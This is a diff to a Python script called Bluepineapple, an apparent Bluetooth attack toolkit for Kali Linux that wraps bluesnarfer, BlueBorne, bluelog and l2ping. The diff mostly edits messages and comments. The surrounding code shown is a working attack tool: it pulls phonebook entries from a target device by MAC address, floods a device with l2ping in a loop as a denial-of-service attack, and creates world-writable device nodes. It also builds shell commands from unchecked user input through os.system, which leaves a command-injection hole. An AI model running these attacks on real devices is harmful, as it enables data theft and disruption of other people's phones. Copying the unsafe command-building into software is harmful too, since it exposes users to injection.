@@ -2,7 +2,7 @@ import os
 import argparse
 import subprocess
 
-parser = argparse.ArgumentParser(description='Bluepineapple is a project to integrate different bluetooth tools to simulate a Pineapple like device. It has been developed for using on Raspberry Pi 4 with Kali Linux installed.')
+parser = argparse.ArgumentParser(description='Bluepineapple is a project to integrate different bluetooth tools to simulate a Pineapple like device. It has been developed for using on Raspberry Pi 4 with Kali Linux installed, however it also works with any kali distribution.')
 parser.add_argument('-i','--interface', help='Bluetooth interface, usually hci0',required=True)
 args = parser.parse_args()
 
@@ -20,7 +20,7 @@ def bluelog(mode):
         print("\n\nDevices detected:")
         os.system("sudo cat btdevices.log")
     else:
-        print("\n\nInvalid option.")
+        print("\n\nInvalid mode.")
 
 def blueranger():
     mac = input("\n\nWrite target MAC address: ")
@@ -40,7 +40,6 @@ def bluesnarfer_setup():
     subprocess.run(["sudo", "mkdir", "-p", "/dev/bluetooth/rfcomm"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "mknod", "-m", "666", "/dev/bluetooth/rfcomm/0", "c", "216", "0"], stdout=subprocess.DEVNULL)
 
-##TODO: expand testing with older devices before further development
 def bluesnarfer(mode):
     bluesnarfer_setup()
     mac = input("\n\nWrite target MAC address: ")
@@ -57,7 +56,7 @@ def bluesnarfer(mode):
     elif "pb" in mode:
         os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + " ME")
     else:
-        print("Invalid option.")
+        print("Invalid action.")
 
 def blueborne():
     mac = input("Write target MAC address: ")
@@ -65,7 +64,6 @@ def blueborne():
 
 def DoS(seq, size):
     mac = input("Write target MAC address: ")
-    ##subprocess.run(["sudo", "seq", str(seq), ">", "numberofpings"], stdout=subprocess.DEVNULL)
     os.system("sudo seq " + str(seq) + " > numberofpings")
     os.system("while read r; do l2ping -s " + str(size) + " " + mac + "; done < numberofpings")
 
@@ -74,7 +72,7 @@ def jieggi_DoS():
 
 def welcome():
     print("\n\n")
-    print("Bluepineapple by using.hacks. it scan, it attac but most importantly it work for old bt")
+    print("Bluepineapple by [INSERT_CLEVER_NAME_HERE]. it scan, it attac but most importantly it work for old bt devices")
 
 def menu():
     print("\n\n")
@@ -99,7 +97,7 @@ def main():
         action = input("Choose action (write 'quit' to exit): ")
 
         if "1" in action:
-            bluelog(input("Choose action (scan or show): "))
+            bluelog(input("Choose mode (scan or show): "))
         elif "2" in action:
             blueranger()
         elif "3" in action:
@@ -109,7 +107,7 @@ def main():
         elif "5" in action:
             jieggi_DoS()
         elif "6" in action:
-            mode = input("\n\nChoose action: ")
+            mode = input("\n\nChoose action (list, default_list, pb or info): ")
             bluesnarfer(mode)
         elif "7" in action:
             blueborne()
